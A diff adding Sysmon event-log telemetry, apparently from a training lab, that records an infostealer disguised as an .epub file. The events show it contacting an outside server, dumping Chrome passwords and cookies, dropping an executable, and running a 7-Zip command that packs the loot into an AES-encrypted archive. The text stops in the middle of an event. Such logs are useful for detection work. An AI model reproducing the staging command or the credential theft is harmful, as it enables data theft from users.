@@ -1,0 +1,1430 @@
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>3</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>3</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:09.0339616Z" /> 
+  <EventRecordID>693064</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4916" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:52.939</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Protocol">tcp</Data> 
+  <Data Name="Initiated">true</Data> 
+  <Data Name="SourceIsIpv6">false</Data> 
+  <Data Name="SourceIp">10.10.10.245</Data> 
+  <Data Name="SourceHostname">WK001.megacorpone.com</Data> 
+  <Data Name="SourcePort">57299</Data> 
+  <Data Name="SourcePortName">-</Data> 
+  <Data Name="DestinationIsIpv6">false</Data> 
+  <Data Name="DestinationIp">145.1.0.92</Data> 
+  <Data Name="DestinationHostname">-</Data> 
+  <Data Name="DestinationPort">443</Data> 
+  <Data Name="DestinationPortName">https</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>5</EventID> 
+  <Version>3</Version> 
+  <Level>4</Level> 
+  <Task>5</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:07.0693917Z" /> 
+  <EventRecordID>693055</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:07.069</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>23</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>23</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:06.8665894Z" /> 
+  <EventRecordID>693054</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:06.865</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\101010245WK001.zip</Data> 
+  <Data Name="Hashes">SHA1=756FF3A252D10493CE9C34297FA7BB6F84DC27A4,MD5=053C53EC53D5E6C720AB105BC46FAE2B,SHA256=B6A1646F23BA0A05B7C80A7D6261204384AB06F15983EB195EB5F0A3FEDF2475,IMPHASH=00000000000000000000000000000000</Data> 
+  <Data Name="IsExecutable">false</Data> 
+  <Data Name="Archived">true</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.7516581Z" /> 
+  <EventRecordID>693050</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.744</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c88d-6891-2937-000000000c00}</Data> 
+  <Data Name="ProcessId">22836</Data> 
+  <Data Name="Image">C:\Program Files\7-Zip\7z.exe</Data> 
+  <Data Name="FileVersion">25.00</Data> 
+  <Data Name="Description">7-Zip Console</Data> 
+  <Data Name="Product">7-Zip</Data> 
+  <Data Name="Company">Igor Pavlov</Data> 
+  <Data Name="OriginalFileName">7z.exe</Data> 
+  <Data Name="CommandLine">"C:\Program Files\7-Zip\7z.exe" a -tzip -pcc9441e5-1c80-4287-9c7a-4c03215c0969WK001 -mem=AES256 C:\Users\a.smith\AppData\Local\Temp\101010245WK001_protected.zip C:\Users\a.smith\AppData\Local\Temp\101010245WK001.zip</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=6476BE55488537A4C44E0AC23B04C13406F19C59,MD5=458AC4303ED2D39C13C533BF779493A9,SHA256=634D38C0C414178E2F35DE5CC0FB29AA082EEC227E630C4481E1AF7694980AC9,IMPHASH=CB2B0BCC7B0B4ECDDFDD5567E32C4AC4</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.7344467Z" /> 
+  <EventRecordID>693036</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.732</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c88d-6891-2837-000000000c00}</Data> 
+  <Data Name="ProcessId">9280</Data> 
+  <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.2161 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Hostname APP</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">hostname.exe</Data> 
+  <Data Name="CommandLine">"hostname"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.7325289Z" /> 
+  <EventRecordID>693035</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.731</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c88d-6891-2737-000000000c00}</Data> 
+  <Data Name="ProcessId">22948</Data> 
+  <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.2161 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Hostname APP</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">hostname.exe</Data> 
+  <Data Name="CommandLine">"hostname"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.6997971Z" /> 
+  <EventRecordID>693026</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.699</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c88d-6891-2637-000000000c00}</Data> 
+  <Data Name="ProcessId">2456</Data> 
+  <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.2161 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Hostname APP</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">hostname.exe</Data> 
+  <Data Name="CommandLine">"hostname"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>1</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>1</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.6981390Z" /> 
+  <EventRecordID>693025</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.696</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c88d-6891-2537-000000000c00}</Data> 
+  <Data Name="ProcessId">22324</Data> 
+  <Data Name="Image">C:\Windows\System32\HOSTNAME.EXE</Data> 
+  <Data Name="FileVersion">10.0.26100.2161 (WinBuild.160101.0800)</Data> 
+  <Data Name="Description">Hostname APP</Data> 
+  <Data Name="Product">Microsoft® Windows® Operating System</Data> 
+  <Data Name="Company">Microsoft Corporation</Data> 
+  <Data Name="OriginalFileName">hostname.exe</Data> 
+  <Data Name="CommandLine">"hostname"</Data> 
+  <Data Name="CurrentDirectory">C:\Windows\System32\</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="LogonGuid">{8404bf77-2fdf-688b-718a-080000000000}</Data> 
+  <Data Name="LogonId">0x88a71</Data> 
+  <Data Name="TerminalSessionId">1</Data> 
+  <Data Name="IntegrityLevel">Medium</Data> 
+  <Data Name="Hashes">SHA1=4BD0421A6428638B02F19F69BDA6AB9A4C18755B,MD5=0411E7CFE0D452AFE541C1EA45033168,SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9,IMPHASH=8CB84C534505B1E47EF25FA2CD9A16BB</Data> 
+  <Data Name="ParentProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ParentProcessId">17852</Data> 
+  <Data Name="ParentImage">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="ParentCommandLine">"C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub"</Data> 
+  <Data Name="ParentUser">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>23</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>23</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.6949105Z" /> 
+  <EventRecordID>693024</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.694</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\WinStatFeed.rss.exe</Data> 
+  <Data Name="Hashes">SHA1=D58591E7163A8F32F690BFF9B042D354153B7D37,MD5=18D90358D511779A3DF98715AA0A86B7,SHA256=59757292C0F4525C8B8F33DD89B937CB7493E2D98B49C5A76EECB18B83BB0019,IMPHASH=F08929C2BA8072A2F38B0EA7BB4C0832</Data> 
+  <Data Name="IsExecutable">true</Data> 
+  <Data Name="Archived">true</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>23</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>23</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.6856817Z" /> 
+  <EventRecordID>693020</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.684</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\Chrome\Default\passwords.txt</Data> 
+  <Data Name="Hashes">SHA1=8146606A9AD1A5ED99EAA1DAD5066939C1D00966,MD5=E404DA9A6A6FDE40AA23FBB6B94858C0,SHA256=DD07EC5FCD383B46A438C573C10EE19D1D04B99B1F9B99B6491DC3F41F9BA668,IMPHASH=00000000000000000000000000000000</Data> 
+  <Data Name="IsExecutable">false</Data> 
+  <Data Name="Archived">true</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>23</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>23</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:05.6851204Z" /> 
+  <EventRecordID>693019</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4896" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:02:05.684</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="TargetFilename">C:\Users\a.smith\AppData\Local\Temp\Chrome\Default\cookies.txt</Data> 
+  <Data Name="Hashes">SHA1=2797008A416AB5789272B6AADB9430D48692BA20,MD5=BD4CC5BA8324724C025A85F2C71066BA,SHA256=C5DD2BCA9FDCA19F6E94FE96BE3F90BFB970FED5E69CA55FF2812DAF5A08886A,IMPHASH=00000000000000000000000000000000</Data> 
+  <Data Name="IsExecutable">false</Data> 
+  <Data Name="Archived">true</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>3</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>3</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:02.0192330Z" /> 
+  <EventRecordID>692868</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4916" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:46.495</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Protocol">tcp</Data> 
+  <Data Name="Initiated">true</Data> 
+  <Data Name="SourceIsIpv6">false</Data> 
+  <Data Name="SourceIp">10.10.10.245</Data> 
+  <Data Name="SourceHostname">WK001.megacorpone.com</Data> 
+  <Data Name="SourcePort">57288</Data> 
+  <Data Name="SourcePortName">-</Data> 
+  <Data Name="DestinationIsIpv6">false</Data> 
+  <Data Name="DestinationIp">145.1.0.92</Data> 
+  <Data Name="DestinationHostname">-</Data> 
+  <Data Name="DestinationPort">8000</Data> 
+  <Data Name="DestinationPortName">-</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>22</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>22</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:01.3507970Z" /> 
+  <EventRecordID>692862</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4944" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:45.385</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="QueryName">news.axonbyte.org</Data> 
+  <Data Name="QueryStatus">0</Data> 
+  <Data Name="QueryResults">::ffff:145.1.0.92;</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>3</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>3</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:00.9866063Z" /> 
+  <EventRecordID>692850</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4916" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:45.525</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
+  <Data Name="Image">C:\Users\a.smith\AppData\Local\Microsoft\Windows\INetCache\IE\66HCZK0X\captcha_privacy[1].epub</Data> 
+  <Data Name="User">MEGACORPONE\a.smith</Data> 
+  <Data Name="Protocol">tcp</Data> 
+  <Data Name="Initiated">true</Data> 
+  <Data Name="SourceIsIpv6">false</Data> 
+  <Data Name="SourceIp">10.10.10.245</Data> 
+  <Data Name="SourceHostname">WK001.megacorpone.com</Data> 
+  <Data Name="SourcePort">57287</Data> 
+  <Data Name="SourcePortName">-</Data> 
+  <Data Name="DestinationIsIpv6">false</Data> 
+  <Data Name="DestinationIp">145.1.0.92</Data> 
+  <Data Name="DestinationHostname">-</Data> 
+  <Data Name="DestinationPort">443</Data> 
+  <Data Name="DestinationPortName">https</Data> 
+  </EventData>
+  </Event>
+
+- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+- <System>
+  <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" /> 
+  <EventID>3</EventID> 
+  <Version>5</Version> 
+  <Level>4</Level> 
+  <Task>3</Task> 
+  <Opcode>0</Opcode> 
+  <Keywords>0x8000000000000000</Keywords> 
+  <TimeCreated SystemTime="2025-08-05T09:02:00.9866009Z" /> 
+  <EventRecordID>692849</EventRecordID> 
+  <Correlation /> 
+  <Execution ProcessID="3796" ThreadID="4916" /> 
+  <Channel>Microsoft-Windows-Sysmon/Operational</Channel> 
+  <Computer>WK001.megacorpone.com</Computer> 
+  <Security UserID="S-1-5-18" /> 
+  </System>
+- <EventData>
+  <Data Name="RuleName">-</Data> 
+  <Data Name="UtcTime">2025-08-05 09:01:45.387</Data> 
+  <Data Name="ProcessGuid">{8404bf77-c85e-6891-0e37-000000000c00}</Data> 
+  <Data Name="ProcessId">17852</Data> 
